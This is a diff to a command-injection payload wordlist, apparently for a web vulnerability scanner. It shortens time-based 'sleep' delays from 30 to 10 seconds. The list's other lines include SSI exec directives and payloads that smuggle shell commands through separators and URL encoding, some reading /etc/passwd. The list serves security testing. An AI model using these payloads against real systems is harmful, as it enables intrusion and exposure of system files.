@@ -23,7 +23,7 @@ echo gaw4f4sdaf12f
 %60echo gaw4f4sdaf12f%60
 %2560echo gaw4f4sdaf12f%2560
 <!--#exec cmd="echo gaw4f4sdaf12f" -->
-<!--#exec cmd="sleep 30" -->
+<!--#exec cmd="sleep 10" -->
 ;$(cat /etc/passwd) > gaw4f4sdaf12f.txt
 |$(cat /etc/passwd) > gaw4f4sdaf12f.txt
 ||$(cat /etc/passwd) > gaw4f4sdaf12f.txt
@@ -35,21 +35,21 @@ echo gaw4f4sdaf12f
 &cat /etc/passwd > gaw4f4sdaf12f.txt
 &&cat /etc/passwd > gaw4f4sdaf12f.txt
 `cat /etc/passwd > gaw4f4sdaf12f.txt`
-;sleep 30
-%3Bsleep 30
-%253Bsleep 30
-|sleep 30
-%7Csleep 30
-%257Csleep 30
-||sleep 30
-%7C%7Csleep 30
-%257C%257Csleep 30
-&sleep 30
-%26sleep 30
-%2526sleep 30
-&&sleep 30
-%26%26sleep 30
-%2526%2526sleep 30
-`sleep 30`
-%60sleep 30%60
-%2560sleep 30%2560
+;sleep 10
+%3Bsleep 10
+%253Bsleep 10
+|sleep 10
+%7Csleep 10
+%257Csleep 10
+||sleep 10
+%7C%7Csleep 10
+%257C%257Csleep 10
+&sleep 10
+%26sleep 10
+%2526sleep 10
+&&sleep 10
+%26%26sleep 10
+%2526%2526sleep 10
+`sleep 10`
+%60sleep 10%60
+%2560sleep 10%2560
